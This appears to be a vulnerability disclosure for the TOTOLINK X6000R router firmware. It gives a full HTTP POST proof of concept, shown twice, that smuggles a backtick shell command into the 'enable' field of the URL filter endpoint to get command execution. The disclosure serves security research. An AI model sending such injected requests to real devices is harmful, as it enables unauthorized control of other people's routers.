# Summary
There is a command execution vulnerability in TOTOLINK X6000R V9.4.0cu.852_B20230719(https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/247/ids/36.html).

Affected component is "/advance/urlf.html".

# Details
Web front-end interface:
![image](https://github.com/user-attachments/assets/5bbfd2c7-028b-4812-ac0d-bbaa7d03e9d0)

Capture the packet and see the enable parameter, and do a blind test directly:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=BB19D84941E95CCC HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 61
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/urlf.html?token=BB19D84941E95CCC
Priority: u=1

{"enable":"`ls >/web/poc_urlf.txt`","addEffect":"0","topicurl":"setUrlFilterRules"}
```
![image](https://github.com/user-attachments/assets/9e5d5508-6b95-4c79-8422-6685783c564b)

![image](https://github.com/user-attachments/assets/058ffc35-a4a3-41bf-a421-e5854e85b5d1)


# PoC
Capture the packet and see the enable parameter, and do a blind test directly:
```HTTP
POST /cgi-bin/cstecgi.cgi?token=BB19D84941E95CCC HTTP/1.1
Host: ip:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 61
Origin: http://ip:8081
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://ip:8081/advance/urlf.html?token=BB19D84941E95CCC
Priority: u=1

{"enable":"`ls >/web/poc_urlf.txt`","addEffect":"0","topicurl":"setUrlFilterRules"}
```
![image](https://github.com/user-attachments/assets/9e5d5508-6b95-4c79-8422-6685783c564b)

![image](https://github.com/user-attachments/assets/058ffc35-a4a3-41bf-a421-e5854e85b5d1)
